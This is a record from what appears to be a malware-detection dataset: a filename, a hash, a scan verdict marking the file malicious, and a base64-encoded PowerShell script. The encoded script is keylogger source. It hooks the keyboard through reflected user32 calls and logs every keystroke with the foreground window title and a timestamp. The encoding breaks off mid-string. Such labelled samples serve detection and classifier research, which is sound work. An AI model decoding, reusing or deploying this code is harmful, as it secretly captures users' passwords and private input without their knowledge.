kk-11.ps1,82fca59307e24c3dde0027e95fd8c07b,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gU2Vrb3J0c3llay1UZWcgewoKICAgIFtDbWRsZXRCaW5kaW5nKCldIAogICAgUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwKV0KICAgICAgICBbVmFsaWRhdGVTY3JpcHQoe1Rlc3QtUGF0aCAoUmVzb2x2ZS1QYXRoIChTcGxpdC1QYXRoIC1QYXJlbnQgLVBhdGggJF8pKSAtUGF0aFR5cGUgQ29udGFpbmVyfSldCiAgICAgICAgW1N0cmluZ10kTG9nUGF0aCA9ICJ8IENsaXAiLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSldCiAgICAgICAgW0RvdWJsZV0kVGltZW91dCwKCiAgICAgICAgW1BhcmFtZXRlcigpXQogICAgICAgIFtTd2l0Y2hdJFBhc3NUaHJ1CiAgICApCgogICAgJExvZ1BhdGggPSBKb2luLVBhdGggKFJlc29sdmUtUGF0aCAoU3BsaXQtUGF0aCAtUGFyZW50ICRMb2dQYXRoKSkgKFNwbGl0LVBhdGggLUxlYWYgJExvZ1BhdGgpCgogICAgdHJ5IHsgJyJUeXBlZEtleSIsIldpbmRvd1RpdGxlIiwiVGltZSInIHwgT3V0LUZpbGUgLUZpbGVQYXRoICRMb2dQYXRoIC1FbmNvZGluZyB1bmljb2RlIH0KICAgIGNhdGNoIHsgdGhyb3cgJF8gfQoKICAgICRTY3JpcHQgPSB7CiAgICAgICAgUGFyYW0gKAogICAgICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCldCiAgICAgICAgICAgIFtTdHJpbmddJExvZ1BhdGgsCgogICAgICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSldCiAgICAgICAgICAgIFtEb3VibGVdJFRpbWVvdXQKICAgICAgICApCgogICAgICAgIGZ1bmN0aW9uIGxvY2FsOkdldC1EZWxlZ2F0ZVR5cGUgewogICAgICAgICAgICBQYXJhbSAoCiAgICAgICAgICAgICAgICBbT3V0cHV0VHlwZShbVHlwZV0pXQogICAgICAgICAgICAKICAgICAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCldCiAgICAgICAgICAgICAgICBbVHlwZVtdXQogICAgICAgICAgICAgICAgJFBhcmFtZXRlcnMgPSAoTmV3LU9iamVjdCBUeXBlW10oMCkpLAogICAgICAgICAgICAKICAgICAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMSApXQogICAgICAgICAgICAgICAgW1R5cGVdCiAgICAgICAgICAgICAgICAkUmV0dXJuVHlwZSA9IFtWb2lkXQogICAgICAgICAgICApCgogICAgICAgICAgICAkRG9tYWluID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4KICAgICAgICAgICAgJER5bkFzc2VtYmx5ID0gTmV3LU9iamVjdCBSZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKQogICAgICAgICAgICAkQXNzZW1ibHlCdWlsZGVyID0gJERvbWFpbi5EZWZpbmVEeW5hbWljQXNzZW1ibHkoJER5bkFzc2VtYmx5LCBbU3lzdGVtLlJlZmxlY3Rpb24uRW1pdC5Bc3NlbWJseUJ1aWxkZXJBY2Nlc3NdOjpSdW4pCiAgICAgICAgICAgICRNb2R1bGVCdWlsZGVyID0gJEFzc2VtYmx5QnVpbGRlci5EZWZpbmVEeW5hbWljTW9kdWxlKCdJbk1lbW9yeU1vZHVsZScsICRmYWxzZSkKICAgICAgICAgICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnTXlEZWxlZ2F0ZVR5cGUnLCAnQ2xhc3MsIFB1YmxpYywgU2VhbGVkLCBBbnNpQ2xhc3MsIEF1dG9DbGFzcycsIFtTeXN0ZW0uTXVsdGljYXN0RGVsZWdhdGVdKQogICAgICAgICAgICAkQ29uc3RydWN0b3JCdWlsZGVyID0gJFR5cGVCdWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJFBhcmFtZXRlcnMpCiAgICAgICAgICAgICRDb25zdHJ1Y3RvckJ1aWxkZXIuU2V0SW1wbGVtZW50YXRpb25GbGFncygnUnVudGltZSwgTWFuYWdlZCcpCiAgICAgICAgICAgICRNZXRob2RCdWlsZGVyID0gJFR5cGVCdWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJFJldHVyblR5cGUsICRQYXJhbWV0ZXJzKQogICAgICAgICAgICAkTWV0aG9kQnVpbGRlci5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKICAgICAgICAKICAgICAgICAgICAgJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQogICAgICAgIH0KICAgICAgICBmdW5jdGlvbiBsb2NhbDpHZXQtUHJvY0FkZHJlc3MgewogICAgICAgICAgICBQYXJhbSAoCiAgICAgICAgICAgICAgICBbT3V0cHV0VHlwZShbSW50UHRyXSldCiAgICAgICAgCiAgICAgICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlICldCiAgICAgICAgICAgICAgICBbU3RyaW5nXQogICAgICAgICAgICAgICAgJE1vZHVsZSwKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICRUcnVlICldCiAgICAgICAgICAgICAgICBbU3RyaW5nXQogICAgICAgICAgICAgICAgJFByb2NlZHVyZQogICAgICAgICAgICApCgoKICAgICAgICAgICAgJFN5c3RlbUFzc2VtYmx5ID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uR2V0QXNzZW1ibGllcygpIHwKICAgICAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfQogICAgICAgICAgICAkVW5zYWZlTmF0aXZlTWV0aG9kcyA9ICRTeXN0ZW1Bc3NlbWJseS5HZXRUeXBlKCdNaWNyb3NvZnQuV2luMzIuVW5zYWZlTmF0aXZlTWV0aG9kcycpCgogICAgICAgICAgICAkR2V0TW9kdWxlSGFuZGxlID0gJFVuc2FmZU5hdGl2ZU1ldGhvZHMuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKQogICAgICAgICAgICAkR2V0UHJvY0FkZHJlc3MgPSAkVW5zYWZlTmF0aXZlTWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJykKCiAgICAgICAgICAgICRLZXJuMzJIYW5kbGUgPSAkR2V0TW9kdWxlSGFuZGxlLkludm9rZSgkbnVsbCwgQCgkTW9kdWxlKSkKICAgICAgICAgICAgJHRtcFB0ciA9IE5ldy1PYmplY3QgSW50UHRyCiAgICAgICAgICAgICRIYW5kbGVSZWYgPSBOZXctT2JqZWN0IFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWYoJHRtcFB0ciwgJEtlcm4zMkhhbmRsZSkKICAgICAgICAKCiAgICAgICAgICAgICRHZXRQcm9jQWRkcmVzcy5JbnZva2UoJG51bGwsIEAoW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZl0kSGFuZGxlUmVmLCAkUHJvY2VkdXJlKSkKICAgICAgICB9CgoKCiAgICAgICAgW3ZvaWRdW1JlZmxlY3Rpb24uQXNzZW1ibHldOjpMb2FkV2l0aFBhcnRpYWxOYW1lKCdTeXN0ZW0uV2luZG93cy5Gb3JtcycpCgoKICAgICAgICAkU2V0V2luZG93c0hvb2tFeEFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgdXNlcjMyLmRsbCBTZXRXaW5kb3dzSG9va0V4QQoJICAgICRTZXRXaW5kb3dzSG9va0V4RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludDMyXSwgW011bHRpY2FzdERlbGVnYXRlXSwgW0ludFB0cl0sIFtJbnQzMl0pIChbSW50UHRyXSkKCSAgICAkU2V0V2luZG93c0hvb2tFeCA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFNldFdpbmRvd3NIb29rRXhBZGRyLCAkU2V0V2luZG93c0hvb2tFeERlbGVnYXRlKQoKCiAgICAgICAgJENhbGxOZXh0SG9va0V4QWRkciA9IEdldC1Qcm9jQWRkcmVzcyB1c2VyMzIuZGxsIENhbGxOZXh0SG9va0V4CgkgICAgJENhbGxOZXh0SG9va0V4RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnQzMl0sIFtJbnRQdHJdLCBbSW50UHRyXSkgKFtJbnRQdHJdKQoJICAgICRDYWxsTmV4dEhvb2tFeCA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJENhbGxOZXh0SG9va0V4QWRkciwgJENhbGxOZXh0SG9va0V4RGVsZWdhdGUpCgoKICAgICAgICAkVW5ob29rV2luZG93c0hvb2tFeEFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgdXNlcjMyLmRsbCBVbmhvb2tXaW5kb3dzSG9va0V4CgkgICAgJFVuaG9va1dpbmRvd3NIb29rRXhEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSkgKFtWb2lkXSkKCSAgICAkVW5ob29rV2luZG93c0hvb2tFeCA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFVuaG9va1dpbmRvd3NIb29rRXhBZGRyLCAkVW5ob29rV2luZG93c0hvb2tFeERlbGVnYXRlKQoKCiAgICAgICAgJFBlZWtNZXNzYWdlQWRkciA9IEdldC1Qcm9jQWRkcmVzcyB1c2VyMzIuZGxsIFBlZWtNZXNzYWdlQQoJICAgICRQZWVrTWVzc2FnZURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtVSW50MzJdLCBbVUludDMyXSkgKFtWb2lkXSkKCSAgICAkUGVla01lc3NhZ2UgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRQZWVrTWVzc2FnZUFkZHIsICRQZWVrTWVzc2FnZURlbGVnYXRlKQoKCiAgICAgICAgJEdldEFzeW5jS2V5U3RhdGVBZGRyID0gR2V0LVByb2NBZGRyZXNzIHVzZXIzMi5kbGwgR2V0QXN5bmNLZXlTdGF0ZQoJICAgICRHZXRBc3luY0tleVN0YXRlRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW1dpbmRvd3MuRm9ybXMuS2V5c10pIChbSW50MTZdKQoJICAgICRHZXRBc3luY0tleVN0YXRlID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkR2V0QXN5bmNLZXlTdGF0ZUFkZHIsICRHZXRBc3luY0tleVN0YXRlRGVsZWdhdGUpCgoKICAgICAgICAkR2V0Rm9yZWdyb3VuZFdpbmRvd0FkZHIgPSBHZXQtUHJvY0FkZHJlc3MgdXNlcjMyLmRsbCBHZXRGb3JlZ3JvdW5kV2luZG93CgkgICAgJEdldEZvcmVncm91bmRXaW5kb3dEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQCgpIChbSW50UHRyXSkKCSAgICAkR2V0Rm9yZWdyb3VuZFdpbmRvdyA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJEdldEZvcmVncm91bmRXaW5kb3dBZGRyLCAkR2V0Rm9yZWdyb3VuZFdpbmRvd0RlbGVnYXRlKQoKCiAgICAgICAgJEdldFdpbmRvd1RleHRBZGRyID0gR2V0LVByb2NBZGRyZXNzIHVzZXIzMi5kbGwgR2V0V2luZG93VGV4dEEKCSAgICAkR2V0V2luZG93VGV4dERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVGV4dC5TdHJpbmdCdWlsZGVyXSwgW0ludDMyXSkgKFtWb2lkXSkKCSAgICAkR2V0V2luZG93VGV4dCA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJEdldFdpbmRvd1RleHRBZGRyLCAkR2V0V2luZG93VGV4dERlbGVnYXRlKQoKCiAgICAgICAgJEdldE1vZHVsZUhhbmRsZUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIEdldE1vZHVsZUhhbmRsZUEKCSAgICAkR2V0TW9kdWxlSGFuZGxlRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW1N0cmluZ10pIChbSW50UHRyXSkKCSAgICAkR2V0TW9kdWxlSGFuZGxlID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkR2V0TW9kdWxlSGFuZGxlQWRkciwgJEdldE1vZHVsZUhhbmRsZURlbGVnYXRlKQogICAgCgoKICAgICAgICAkQ2FsbGJhY2tTY3JpcHQgPSB7CiAgICAgICAgICAgIFBhcmFtICgKICAgICAgICAgICAgICAgIFtQYXJhbWV0ZXIoKV0KICAgICAgICAgICAgICAgIFtJbnQzMl0kQ29kZSwKCiAgICAgICAgICAgICAgICBbUGFyYW1ldGVyKCldCiAgICAgICAgICAgICAgICBbSW50UHRyXSR3UGFyYW0sCgogICAgICAgICAgICAgICAgW1BhcmFtZXRlcigpXQogICAgICAgICAgICAgICAgW0ludFB0cl0kbFBhcmFtCiAgICAgICAgICAgICkKCiAgICAgICAgICAgICRLZXlzID0gW1dpbmRvd3MuRm9ybXMuS2V5c10KICAgICAgICAKICAgICAgICAgICAgJE1zZ1R5cGUgPSAkd1BhcmFtLlRvSW50MzIoKQoKCiAgICAgICAgICAgIGlmICgkQ29kZSAtZ2UgMCAtYW5kICgkTXNnVHlwZSAtZXEgMHgxMDAgLW9yICRNc2dUeXBlIC1lcSAweDEwNCkpIHsKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkaFdpbmRvdyA9ICRHZXRGb3JlZ3JvdW5kV2luZG93Lkludm9rZSgpCgogICAgICAgICAgICAgICAgJFNoaWZ0U3RhdGUgPSAkR2V0QXN5bmNLZXlTdGF0ZS5JbnZva2UoJEtleXM6OlNoaWZ0S2V5KQogICAgICAgICAgICAgICAgaWYgKCgkU2hpZnRTdGF0ZSAtYmFuZCAweDgwMDApIC1lcSAweDgwMDApIHsgJFNoaWZ0ID0gJHRydWUgfQogICAgICAgICAgICAgICAgZWxzZSB7ICRTaGlmdCA9ICRmYWxzZSB9CgogICAgICAgICAgICAgICAgJENhcHMgPSBbQ29uc29sZV06OkNhcHNMb2NrCgoKICAgICAgICAgICAgICAgICR2S2V5ID0gW1dpbmRvd3MuRm9ybXMuS2V5c11bUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlJlYWRJbnQzMigkbFBhcmFtKQoKCiAgICAgICAgICAgICAgICBpZiAoJHZLZXkgLWd0IDY0IC1hbmQgJHZLZXkgLWx0IDkxKSB7ICMgQWxwaGFiZXQgY2hhcmFjdGVycwogICAgICAgICAgICAgICAgICAgIGlmICgkU2hpZnQgLXhvciAkQ2FwcykgeyAkS2V5ID0gJHZLZXkuVG9TdHJpbmcoKSB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7ICRLZXkgPSAkdktleS5Ub1N0cmluZygpLlRvTG93ZXIoKSB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYgKCR2S2V5IC1nZSA5NiAtYW5kICR2S2V5IC1sZSAxMTEpIHsgIyBOdW1iZXIgcGFkIGNoYXJhY3RlcnMKICAgICAgICAgICAgICAgICAgICBzd2l0Y2ggKCR2S2V5LnZhbHVlX18pIHsKICAgICAgICAgICAgICAgICAgICAgICAgOTYgeyAkS2V5ID0gJzAnIH0KICAgICAgICAgICAgICAgICAgICAgICAgOTcgeyAkS2V5ID0gJzEnIH0KICAgICAgICAgICAgICAgICAgICAgICAgOTggeyAkS2V5ID0gJzInIH0KICAgICAgICAgICAgICAgICAgICAgICAgOTkgeyAkS2V5ID0gJzMnIH0KICAgICAgICAgICAgICAgICAgICAgICAgMTAwIHsgJEtleSA9ICc0JyB9CiAgICAgICAgICAgICAgICAgICAgICAgIDEwMSB7ICRLZXkgPSAnNScgfQogICAgICAgICAgICAgICAgICAgICAgICAxMDIgeyAkS2V5ID0gJzYnIH0KICAgICAgICAgICAgICAgICAgICAgICAgMTAzIHsgJEtleSA9ICc3JyB9CiAgICAgICAgICAgICAgICAgICAgICAgIDEwNCB7ICRLZXkgPSAnOCcgfQogICAgICAgICAgICAgICAgICAgICAgICAxMDUgeyAkS2V5ID0gJzknIH0KICAgICAgICAgICAgICAgICAgICAgICAgMTA2IHsgJEtleSA9ICIqIiB9CiAgICAgICAgICAgICAgICAgICAgICAgIDEwNyB7ICRLZXkgPSAiKyIgfQogICAgICAgICAgICAgICAgICAgICAgICAxMDggeyAkS2V5ID0gInwiIH0KICAgICAgICAgICAgICAgICAgICAgICAgMTA5IHsgJEtleSA9ICItIiB9CiAgICAgICAgICAgICAgICAgICAgICAgIDExMCB7ICRLZXkgPSAiLiIgfQogICAgICAgICAgICAgICAgICAgICAgICAxMTEgeyAkS2V5ID0gIi8iIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYgKCgkdktleSAtZ2UgNDggLWFuZCAkdktleSAtbGUgNTcpIC1vciAoJHZLZXkgLWdlIDE4NiAtYW5kICR2S2V5IC1sZSAxOTIpIC1vciAoJHZLZXkgLWdlIDIxOSAtYW5kICR2S2V5IC1sZSAyMjIpKSB7ICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmICgkU2hpZnQpIHsgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgc3dpdGNoICgkdktleS52YWx1ZV9fKSB7ICMgU2hpZnRhYmxlIGNoYXJhY3RlcnMKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDQ4IHsgJEtleSA9ICcpJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA0OSB7ICRLZXkgPSAnIScgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgNTAgeyAkS2V5ID0gJ0AnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDUxIHsgJEtleSA9ICcjJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA1MiB7ICRLZXkgPSAnJCcgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgNTMgeyAkS2V5ID0gJyUnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDU0IHsgJEtleSA9ICdeJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA1NSB7ICRLZXkgPSAnJicgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgNTYgeyAkS2V5ID0gJyonIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDU3IHsgJEtleSA9ICcoJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAxODYgeyAkS2V5ID0gJzonIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDE4NyB7ICRLZXkgPSAnKycgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMTg4IHsgJEtleSA9ICc8JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAxODkgeyAkS2V5ID0gJ18nIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDE5MCB7ICRLZXkgPSAnPicgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMTkxIHsgJEtleSA9ICc/JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAxOTIgeyAkS2V5ID0gJ34nIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDIxOSB7ICRLZXkgPSAneycgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMjIwIHsgJEtleSA9ICd8JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAyMjEgeyAkS2V5ID0gJ30nIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDIyMiB7ICRLZXkgPSAnPERvdWJsZSBRdW90ZXM+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIHN3aXRjaCAoJHZLZXkudmFsdWVfXykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgNDggeyAkS2V5ID0gJzAnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDQ5IHsgJEtleSA9ICcxJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA1MCB7ICRLZXkgPSAnMicgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgNTEgeyAkS2V5ID0gJzMnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDUyIHsgJEtleSA9ICc0JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA1MyB7ICRLZXkgPSAnNScgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgNTQgeyAkS2V5ID0gJzYnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDU1IHsgJEtleSA9ICc3JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA1NiB7ICRLZXkgPSAnOCcgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgNTcgeyAkS2V5ID0gJzknIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDE4NiB7ICRLZXkgPSAnOycgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMTg3IHsgJEtleSA9ICc9JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAxODggeyAkS2V5ID0gJywnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDE4OSB7ICRLZXkgPSAnLScgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMTkwIHsgJEtleSA9ICcuJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAxOTEgeyAkS2V5ID0gJy8nIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDE5MiB7ICRLZXkgPSAnYCcgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMjE5IHsgJEtleSA9ICdbJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAyMjAgeyAkS2V5ID0gJ1wnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDIyMSB7ICRLZXkgPSAnXScgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMjIyIHsgJEtleSA9ICc8U2luZ2xlIFF1b3RlPicgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgc3dpdGNoICgkdktleSkgewogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6RjEgIHsgJEtleSA9ICc8RjE+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpGMiAgeyAkS2V5ID0gJzxGMj4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkYzICB7ICRLZXkgPSAnPEYzPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6RjQgIHsgJEtleSA9ICc8RjQ+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpGNSAgeyAkS2V5ID0gJzxGNT4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkY2ICB7ICRLZXkgPSAnPEY2PicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6RjcgIHsgJEtleSA9ICc8Rjc+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpGOCAgeyAkS2V5ID0gJzxGOD4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkY5ICB7ICRLZXkgPSAnPEY5PicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6RjEwIHsgJEtleSA9ICc8RjEwPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6RjExIHsgJEtleSA9ICc8RjExPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6RjEyIHsgJEtleSA9ICc8RjEyPicgfQoJCQkKICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OlNuYXBzaG90ICAgIHsgJEtleSA9ICc8UHJpbnQgU2NyZWVuPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6U2Nyb2xsICAgICAgeyAkS2V5ID0gJzxTY3JvbGwgTG9jaz4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OlBhdXNlICAgICAgIHsgJEtleSA9ICc8UGF1c2UvQnJlYWs+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpJbnNlcnQgICAgICB7ICRLZXkgPSAnPEluc2VydD4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkhvbWUgICAgICAgIHsgJEtleSA9ICc8SG9tZT4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkRlbGV0ZSAgICAgIHsgJEtleSA9ICc8RGVsZXRlPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6RW5kICAgICAgICAgeyAkS2V5ID0gJzxFbmQ+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpQcmlvciAgICAgICB7ICRLZXkgPSAnPFBhZ2UgVXA+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpOZXh0ICAgICAgICB7ICRLZXkgPSAnPFBhZ2UgRG93bj4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkVzY2FwZSAgICAgIHsgJEtleSA9ICc8RXNjPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6TnVtTG9jayAgICAgeyAkS2V5ID0gJzxOdW0gTG9jaz4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkNhcGl0YWwgICAgIHsgJEtleSA9ICc8Q2FwcyBMb2NrPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6VGFiICAgICAgICAgeyAkS2V5ID0gJzxUYWI+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpCYWNrICAgICAgICB7ICRLZXkgPSAnPEJhY2tzcGFjZT4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkVudGVyICAgICAgIHsgJEtleSA9ICc8RW50ZXI+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpTcGFjZSAgICAgICB7ICRLZXkgPSAnPCA+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpMZWZ0ICAgICAgICB7ICRLZXkgPSAnPExlZnQ+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpVcCAgICAgICAgICB7ICRLZXkgPSAnPFVwPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6UmlnaHQgICAgICAgeyAkS2V5ID0gJzxSaWdodD4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkRvd24gICAgICAgIHsgJEtleSA9ICc8RG93bj4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkxNZW51ICAgICAgIHsgJEtleSA9ICc8QWx0PicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6Uk1lbnUgICAgICAgeyAkS2V5ID0gJzxBbHQ+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpMV2luICAgICAgICB7ICRLZXkgPSAnPFdpbmRvd3MgS2V5PicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6UldpbiAgICAgICAgeyAkS2V5ID0gJzxXaW5kb3dzIEtleT4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkxTaGlmdEtleSAgIHsgJEtleSA9ICc8U2hpZnQ+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpSU2hpZnRLZXkgICB7IC